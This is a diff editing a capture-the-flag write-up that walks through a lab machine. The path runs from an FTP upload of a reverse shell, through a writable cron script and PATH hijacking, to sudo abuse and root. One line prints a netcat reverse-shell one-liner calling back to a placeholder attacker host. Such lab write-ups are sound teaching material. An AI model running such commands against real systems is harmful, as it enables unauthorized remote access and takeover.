@@ -29,7 +29,9 @@ Files are processed automatically on arrival.
 Invalid formats are ignored.
 ```
 
-So anything dropped into `incoming/` gets picked up automatically. Since I already had write access to that folder over FTP, I uploaded a reverse shell script with `put` and got a callback — along with the `recon_user` flag:
+## Initial access 
+
+So anything dropped into `incoming/` is processed automatically. Since I already had write access to that folder over FTP, I uploaded a reverse shell script with `put` and got the reverse shell and first flag:
 
 ![First flag](images/first_flag.png)
 
@@ -41,7 +43,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 
 ## Escalation to `dev_user`
 
-With a shell as `recon_user`, I pulled down `pspy64` to watch what was running in the background. Two processes kept popping up on a schedule:
+With a shell as `recon_user`, I ran `pspy64` to watch what was running in the background. It revealed two interesting processes:
 
 ```
 2026/08/16 06:23:01 CMD: UID=1002  PID=3151   | /bin/bash /opt/dev/backup.sh 
@@ -54,8 +56,6 @@ With a shell as `recon_user`, I pulled down `pspy64` to watch what was running i
 #!/bin/bash
 tar -czf /tmp/recon_backup.tgz /home/recon_user
 ```
-
-![Backup.sh permissions](images/backup_permissions.png)
 
 Turns out anyone in the `dev_user` group could edit this script — and `recon_user` happened to be in that group. So I overwrote `backup.sh` with a reverse shell payload, waited for the next scheduled run, and caught a shell as `dev_user`:
 
@@ -84,7 +84,7 @@ I also noticed a `ps` binary sitting in `/opt/dev/bin`, owned by `dev_user`. Sin
 
 ![Healthcheck path](images/healthcheck_path.png)
 
-So I dropped a reverse shell into `/opt/dev/bin/ps`, made it executable, and waited. The next time `healthcheck` ran, it executed my fake `ps` instead of the real one, giving me a shell as `monitor_user`:
+So I added a reverse shell into `/opt/dev/bin/ps`, made it executable, and waited. The next time `healthcheck` ran, it executed my fake `ps` instead of the real one, giving me a shell as `monitor_user`:
 
 ![Third flag](images/third_flag.png)
 
@@ -189,7 +189,5 @@ From there, it was a matter of walking up through one trust boundary after anoth
 - **Privilege Escalation:** PATH hijacking via `healthcheck` → `monitor_user`
 - **Privilege Escalation:** Abused `sudo` rights plus a writable deployment helper script → `ops_user`
 - **Final Escalation:** SSH access combined with `sudo less` → root shell
-
-At its core, this box came down to **loose permissions, unsafe automation, and too much implicit trust between users and services** — every one of those weak links chained together to take it from anonymous FTP all the way to root.
 
 > Thanks for reading!
